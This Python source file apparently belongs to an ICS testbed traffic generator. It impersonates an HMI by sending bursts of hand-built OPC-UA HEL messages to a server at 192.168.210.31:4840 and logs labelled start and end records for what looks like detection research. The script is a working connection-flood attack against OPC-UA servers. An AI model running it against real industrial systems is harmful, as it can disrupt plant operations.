"""
HMI_FAKE_DISPLAY
Kỹ thuật: Giả lập HMI kết nối OPC-UA bất thường (raw socket).
          Burst connect/HEL — server phải xử lý mỗi kết nối.
Observable: OPC-UA TCP burst từ IP lạ (không phải HMI hợp lệ).

Gọi từ bash:
  python -m attacks_ext.hmi_fake_display \
      --duration 300 --opc-url opc.tcp://192.168.210.31:4840 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import socket
import struct
import time
from attacks_ext.config_ext import base_parser, write_label

INTERVAL = 0.2


def build_hello(host, port):
    endpoint = f"opc.tcp://{host}:{port}".encode()
    ep_len = len(endpoint)
    msg_size = 28 + ep_len
    return (
        b'HEL' + b'F' +
        struct.pack('<IIIIII', msg_size, 0, 65536, 65536, 0, 0) +
        struct.pack('<I', ep_len) + endpoint
    )


def fake_hmi_connect(host, port, hello_msg):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, port))
        s.send(hello_msg)
        try:
            s.recv(1024)
        except Exception:
            pass
        s.close()
        return True
    except Exception:
        return False


def run(args):
    label_prefix = "HMI_FAKE_DISPLAY"

    # Parse host:port from opc_url
    url = args.opc_url.replace("opc.tcp://", "")
    parts = url.split(":")
    host = parts[0]
    port = int(parts[1]) if len(parts) > 1 else 4840

    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s target={host}:{port}")

    success_count = 0
    total = 0
    hello = build_hello(host, port)
    end_time = time.time() + args.duration

    try:
        print(f"[*] HMI_FAKE_DISPLAY -> {host}:{port}")
        print(f"[*] Burst OPC-UA HEL connects, interval {INTERVAL}s")

        while time.time() < end_time:
            result = fake_hmi_connect(host, port, hello)
            total += 1
            if result:
                success_count += 1
            if total % 20 == 0:
                print(f"  [{total}] sent={success_count} rate={success_count//(time.time()-end_time+args.duration+1):.0f}/s")
            time.sleep(INTERVAL)

        print(f"[*] Done: {success_count}/{total} connects")

    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"connects={success_count}/{total}")


def main():
    p = base_parser("HMI Fake Display Attack (Raw OPC-UA)")
    p.add_argument("--opc-url", default="opc.tcp://192.168.210.31:4840")
    p.add_argument("--opc-username", default="")
    p.add_argument("--opc-password", default="")
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
